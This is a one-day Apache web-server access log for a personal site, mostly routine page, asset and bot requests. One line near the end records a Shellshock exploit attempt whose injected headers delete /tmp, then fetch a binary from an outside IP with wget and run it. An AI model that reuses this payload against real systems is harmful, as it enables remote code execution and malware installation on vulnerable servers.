::1 - - [22/Sep/2015:12:50:51 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:12:51:45 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
14.139.240.50 - - [22/Sep/2015:12:52:51 +0530] "GET /favicon.ico HTTP/1.1" 404 505 "-" "Mozilla/5.0 (Android; Mobile; rv:40.0.3) Gecko/40.0.3 Firefox/40.0.3"
14.139.240.50 - - [22/Sep/2015:12:52:51 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Android; Mobile; rv:40.0.3) Gecko/40.0.3 Firefox/40.0.3"
14.139.240.50 - - [22/Sep/2015:12:53:28 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
14.139.240.50 - - [22/Sep/2015:12:53:28 +0530] "GET /css/style.css HTTP/1.1" 200 488 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
14.139.240.50 - - [22/Sep/2015:12:53:28 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17586 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
14.139.240.50 - - [22/Sep/2015:12:53:28 +0530] "GET /img/mainbg.png HTTP/1.1" 304 182 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
14.139.240.50 - - [22/Sep/2015:12:53:28 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
14.139.240.50 - - [22/Sep/2015:12:54:57 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
14.139.240.50 - - [22/Sep/2015:12:54:57 +0530] "GET /css/style.css HTTP/1.1" 200 488 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
14.139.240.50 - - [22/Sep/2015:12:54:57 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17586 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
14.139.240.50 - - [22/Sep/2015:12:54:58 +0530] "GET /img/mainbg.png HTTP/1.1" 200 1280738 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
14.139.240.50 - - [22/Sep/2015:12:55:01 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
14.139.240.50 - - [22/Sep/2015:12:55:01 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
::1 - - [22/Sep/2015:13:03:16 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
14.139.240.50 - - [22/Sep/2015:13:05:57 +0530] "GET /favicon.ico HTTP/1.1" 404 505 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
::1 - - [22/Sep/2015:13:17:23 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:13:17:32 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:13:17:33 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:13:17:34 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:13:17:35 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:13:17:36 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:13:17:37 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:13:18:25 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:13:18:26 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:13:20:05 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
188.166.40.236 - - [22/Sep/2015:13:37:38 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
188.166.40.236 - - [22/Sep/2015:13:37:39 +0530] "GET /css/style.css HTTP/1.1" 200 488 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
188.166.40.236 - - [22/Sep/2015:13:37:39 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17585 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
188.166.40.236 - - [22/Sep/2015:13:37:42 +0530] "GET /favicon.ico HTTP/1.1" 404 505 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
188.166.40.236 - - [22/Sep/2015:13:37:41 +0530] "GET /img/mainbg.png HTTP/1.1" 200 1280738 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
::1 - - [22/Sep/2015:13:44:38 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:13:50:39 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
158.69.27.241 - - [22/Sep/2015:13:50:45 +0530] "PROPFIND /webdav/ HTTP/1.1" 405 567 "-" "WEBDAV Client"
::1 - - [22/Sep/2015:13:50:53 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:14:01:37 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:14:03:56 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:14:29:50 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:14:42:35 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:14:43:09 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
223.225.186.210 - - [22/Sep/2015:14:48:24 +0530] "GET /favicon.ico HTTP/1.1" 404 505 "-" "Mozilla/5.0 (Android; Mobile; rv:40.0.3) Gecko/40.0.3 Firefox/40.0.3"
223.225.186.210 - - [22/Sep/2015:14:48:24 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Android; Mobile; rv:40.0.3) Gecko/40.0.3 Firefox/40.0.3"
66.249.84.254 - - [22/Sep/2015:14:56:39 +0530] "GET / HTTP/1.1" 200 990 "-" "Google favicon"
66.249.84.195 - - [22/Sep/2015:14:56:40 +0530] "GET /favicon.ico HTTP/1.1" 404 505 "-" "Google favicon"
66.249.82.231 - - [22/Sep/2015:14:56:40 +0530] "GET / HTTP/1.1" 200 990 "http://www.google.com/search" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36"
66.249.82.221 - - [22/Sep/2015:14:56:41 +0530] "GET /css/style.css HTTP/1.1" 200 489 "http://arpansharma.xyz/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36"
66.249.82.221 - - [22/Sep/2015:14:56:41 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17586 "http://arpansharma.xyz/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36"
66.249.82.226 - - [22/Sep/2015:14:56:42 +0530] "GET /img/mainbg.png HTTP/1.1" 200 1280739 "http://arpansharma.xyz/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36"
::1 - - [22/Sep/2015:14:56:49 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:15:26:29 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:15:31:09 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:15:34:20 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:15:37:01 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
14.139.240.50 - - [22/Sep/2015:15:49:15 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
14.139.240.50 - - [22/Sep/2015:15:49:16 +0530] "GET /css/style.css HTTP/1.1" 200 488 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
14.139.240.50 - - [22/Sep/2015:15:49:16 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17586 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
14.139.240.50 - - [22/Sep/2015:15:49:17 +0530] "GET /img/mainbg.png HTTP/1.1" 200 1280738 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
14.139.240.50 - - [22/Sep/2015:15:49:20 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
14.139.240.50 - - [22/Sep/2015:15:49:20 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
14.139.240.50 - - [22/Sep/2015:15:54:03 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
14.139.240.50 - - [22/Sep/2015:15:54:03 +0530] "GET /css/style.css HTTP/1.1" 200 488 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
14.139.240.50 - - [22/Sep/2015:15:54:04 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17586 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
14.139.240.50 - - [22/Sep/2015:15:54:04 +0530] "GET /img/mainbg.png HTTP/1.1" 304 182 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
14.139.240.50 - - [22/Sep/2015:15:54:04 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
14.139.240.50 - - [22/Sep/2015:15:54:05 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
::1 - - [22/Sep/2015:16:04:53 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:16:05:16 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:16:08:00 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:16:13:45 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:16:13:46 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:16:41:14 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:17:03:29 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:17:03:50 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:17:27:03 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:17:28:39 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:18:04:40 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:18:04:41 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:18:05:16 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:18:05:17 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:18:07:31 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
14.139.240.50 - - [22/Sep/2015:18:08:51 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
14.139.240.50 - - [22/Sep/2015:18:08:51 +0530] "GET /css/style.css HTTP/1.1" 200 488 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
14.139.240.50 - - [22/Sep/2015:18:08:51 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17586 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
14.139.240.50 - - [22/Sep/2015:18:08:52 +0530] "GET /img/mainbg.png HTTP/1.1" 304 182 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
14.139.240.50 - - [22/Sep/2015:18:08:52 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
14.139.240.50 - - [22/Sep/2015:18:08:52 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
::1 - - [22/Sep/2015:18:12:12 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:18:16:02 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:18:34:34 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:19:06:03 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:19:30:36 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:19:39:11 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
106.192.0.244 - - [22/Sep/2015:19:42:34 +0530] "GET /favicon.ico HTTP/1.1" 404 505 "-" "Mozilla/5.0 (Android; Mobile; rv:40.0.3) Gecko/40.0.3 Firefox/40.0.3"
106.192.0.244 - - [22/Sep/2015:19:42:35 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Android; Mobile; rv:40.0.3) Gecko/40.0.3 Firefox/40.0.3"
106.192.0.244 - - [22/Sep/2015:19:43:04 +0530] "GET /favicon.ico HTTP/1.1" 404 505 "-" "Mozilla/5.0 (Android; Mobile; rv:40.0.3) Gecko/40.0.3 Firefox/40.0.3"
106.192.0.244 - - [22/Sep/2015:19:43:05 +0530] "GET /favicon.ico HTTP/1.1" 404 504 "-" "Mozilla/5.0 (Android; Mobile; rv:40.0.3) Gecko/40.0.3 Firefox/40.0.3"
96.44.187.133 - - [22/Sep/2015:19:45:21 +0530] "GET / HTTP/1.1" 200 2241 "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://107.167.12.73:9987/aiai80 -O /tmp/China.Z-rctj\xa8 >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-rctj\xa8 >> /tmp/Run.sh;echo /tmp/China.Z-rctj\xa8 >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\"" "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://107.167.12.73:9987/aiai80 -O /tmp/China.Z-rctj\xa8 >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-rctj\xa8 >> /tmp/Run.sh;echo /tmp/China.Z-rctj\xa8 >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\""
::1 - - [22/Sep/2015:19:57:44 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
14.139.240.50 - - [22/Sep/2015:20:32:08 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
14.139.240.50 - - [22/Sep/2015:20:32:08 +0530] "GET /css/style.css HTTP/1.1" 200 488 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
14.139.240.50 - - [22/Sep/2015:20:32:08 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17586 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
14.139.240.50 - - [22/Sep/2015:20:32:08 +0530] "GET /img/mainbg.png HTTP/1.1" 304 182 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
158.69.27.241 - - [22/Sep/2015:20:40:50 +0530] "PROPFIND /webdav/ HTTP/1.1" 405 567 "-" "WEBDAV Client"
::1 - - [22/Sep/2015:20:54:27 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:20:55:11 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:20:55:12 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:20:55:13 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:20:55:14 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:20:56:32 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:20:56:33 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:20:56:34 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:20:56:35 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:20:56:36 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:20:56:37 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:20:56:38 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
::1 - - [22/Sep/2015:21:10:04 +0530] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.11 OpenSSL/1.0.1f (internal dummy connection)"
14.139.240.50 - - [22/Sep/2015:21:20:05 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0"
14.139.240.50 - - [22/Sep/2015:21:21:24 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
14.139.240.50 - - [22/Sep/2015:21:21:25 +0530] "GET /css/style.css HTTP/1.1" 200 488 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
14.139.240.50 - - [22/Sep/2015:21:21:25 +0530] "GET /css/bootstrap.min.css HTTP/1.1" 200 17585 "http://arpansharma.xyz/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
14.139.240.50 - - [22/Sep/2015:21:21:33 +0530] "GET /img/mainbg.png HTTP/1.1" 304 183 "http://arpansharma.xyz/css/style.css" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
14.139.240.50 - - [22/Sep/2015:21:22:19 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
14.139.240.50 - - [22/Sep/2015:21:22:57 +0530] "GET / HTTP/1.1" 200 990 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
